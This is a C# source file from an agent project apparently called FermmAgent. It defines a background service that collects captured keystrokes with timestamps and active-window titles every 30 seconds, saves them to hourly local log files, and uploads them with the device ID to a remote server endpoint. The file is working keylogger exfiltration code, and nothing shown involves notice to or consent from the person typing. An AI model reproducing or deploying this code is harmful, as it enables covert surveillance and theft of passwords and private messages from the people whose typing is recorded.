using System.Text;
using System.Text.Json;
using FermmAgent.Handlers;

namespace FermmAgent.Services;

public class KeylogUploadService : BackgroundService
{
    private readonly ILogger<KeylogUploadService> _logger;
    private readonly IHttpClientFactory _httpFactory;
    private readonly AgentConfig _config;
    private readonly TimeSpan _uploadInterval = TimeSpan.FromSeconds(30);
    private readonly TimeSpan _fileRotateInterval = TimeSpan.FromHours(1);
    
    private string _currentLogFile = string.Empty;
    private DateTime _lastRotation = DateTime.MinValue;
    private readonly object _fileLock = new();

    public KeylogUploadService(
        ILogger<KeylogUploadService> logger,
        IHttpClientFactory httpFactory,
        AgentConfig config)
    {
        _logger = logger;
        _httpFactory = httpFactory;
        _config = config;
        EnsureLogDirectory();
    }

    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        _logger.LogInformation("Keylog upload service started");

        while (!stoppingToken.IsCancellationRequested)
        {
            try
            {
                await Task.Delay(_uploadInterval, stoppingToken);

                // Only process if keylogger is active
                if (!KeyloggerHandler.IsActive)
                    continue;

                var entries = KeyloggerHandler.GetBufferForUpload();
                
                if (entries.Count == 0)
                    continue;

                // Save to hourly files locally
                await SaveToHourlyFile(entries, stoppingToken);
                
                // Still upload to server for real-time monitoring
                await UploadKeylogs(entries, stoppingToken);
            }
            catch (OperationCanceledException)
            {
                break;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error in keylog upload service");
            }
        }

        _logger.LogInformation("Keylog upload service stopped");
    }

    private void EnsureLogDirectory()
    {
        var logDir = Path.Combine(AppContext.BaseDirectory, "keylogs");
        if (!Directory.Exists(logDir))
        {
            Directory.CreateDirectory(logDir);
            _logger.LogInformation("Created keylog directory: {Directory}", logDir);
        }
    }

    private async Task SaveToHourlyFile(List<KeylogEntry> entries, CancellationToken ct)
    {
        lock (_fileLock)
        {
            var now = DateTime.Now;
            
            // Check if we need to rotate to a new hourly file
            if (string.IsNullOrEmpty(_currentLogFile) || 
                now.Hour != _lastRotation.Hour || 
                now.Date != _lastRotation.Date)
            {
                var logDir = Path.Combine(AppContext.BaseDirectory, "keylogs");
                var timestamp = now.ToString("yyyy-MM-dd_HH");
                _currentLogFile = Path.Combine(logDir, $"keylog_{timestamp}.txt");
                _lastRotation = now;
                
                _logger.LogInformation("Rotating to new hourly keylog file: {File}", _currentLogFile);
            }
        }

        try
        {
            var logLines = entries.Select(entry => 
                $"{entry.Timestamp:yyyy-MM-dd HH:mm:ss.fff}\t{entry.Key}\t{entry.WindowTitle ?? "Unknown"}"
            ).ToList();

            await File.AppendAllLinesAsync(_currentLogFile, logLines, ct);
            
            _logger.LogDebug("Saved {Count} keylog entries to {File}", entries.Count, Path.GetFileName(_currentLogFile));
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Failed to save keylog entries to file");
        }
    }

    private async Task UploadKeylogs(List<KeylogEntry> entries, CancellationToken ct)
    {
        try
        {
            var http = _httpFactory.CreateClient("FermmAgent");
            
            var payload = new
            {
                device_id = _config.DeviceId,
                entries = entries.Select(e => new
                {
                    key = e.Key.ToString(),
                    timestamp = e.Timestamp.ToString("o"),
                    window_title = e.WindowTitle
                }).ToList()
            };

            var content = new StringContent(
                JsonSerializer.Serialize(payload),
                Encoding.UTF8,
                "application/json"
            );

            var response = await http.PostAsync(
                $"api/devices/{_config.DeviceId}/keylogs/upload",
                content,
                ct
            );

            if (response.IsSuccessStatusCode)
            {
                _logger.LogDebug("Uploaded {Count} keylog entries", entries.Count);
            }
            else
            {
                _logger.LogWarning("Failed to upload keylogs: {Status}", response.StatusCode);
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Failed to upload keylog data");
        }
    }
}
